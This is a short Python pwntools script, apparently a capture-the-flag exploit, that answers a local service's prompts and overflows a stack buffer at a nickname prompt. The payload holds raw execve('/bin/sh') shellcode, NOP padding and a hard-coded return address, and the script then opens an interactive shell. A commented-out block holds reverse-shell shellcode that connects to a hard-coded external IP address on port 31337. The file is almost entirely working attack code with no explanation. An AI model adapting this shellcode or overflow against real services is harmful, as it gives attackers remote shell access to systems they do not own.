from pwn import *

DEBUG = True

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

"""
shellcode = ("\x48\x31\xc0\x48\x31\xff\x48\x31"
"\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
"\x02"
"\x7a\x69"
"\xc7\x44\x24\x04"
"\x8d\xdf\xaf\xe5"
"\x48\x89\xe6\x6a\x10"
"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
"\x5f\x6a\x3b\x58\x0f\x05")
"""

def r(p, msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)

p = remote('localhost', 6666)

r(p, "letter)")
p.sendline("arsenal")

r(p, "letter)")
p.sendline("gyeongbokgung")

r(p, "letter)")
p.sendline("psy")

data_addr = p64(0x7fffad402ea0 + 0x10)
return_addr = p64(0x7fffad4035f0)

payload = "\x00" * 0x8
payload += shellcode
payload += "\x90" * (0x108 - len(payload))
payload += data_addr

r(p, "nickname:")
p.sendline(payload)

log.info (p.recvall().encode("hex"))

p.interactive()

p.close()
